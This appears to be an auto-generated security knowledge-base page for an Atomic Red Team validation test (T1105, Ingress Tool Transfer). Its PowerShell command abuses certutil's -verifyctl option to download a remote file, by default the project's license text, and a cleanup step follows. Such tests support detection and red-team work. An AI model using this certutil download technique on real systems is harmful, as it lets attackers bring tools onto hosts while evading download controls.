---
atomic_guid: "ffd492e3-0455-4518-9fb1-46527c9f241b"
title: "certutil download (verifyctl)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "ffd492e3-0455-4518-9fb1-46527c9f241b"
  - "certutil download (verifyctl)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# certutil download (verifyctl)

Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!

## Metadata

- Atomic GUID: ffd492e3-0455-4518-9fb1-46527c9f241b
- Technique: T1105: Ingress Tool Transfer
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1105/T1105.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Input Arguments

### local_path

- description: Local path to place file
- type: path
- default: Atomic-license.txt

### remote_file

- description: URL of file to copy
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt

## Executor

- name: powershell

### Command

```powershell
$datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f #{remote_file}
Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
```

### Cleanup

```powershell
Remove-Item "certutil-$(Get-Date -format yyyy_MM_dd)" -Force -Recurse -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
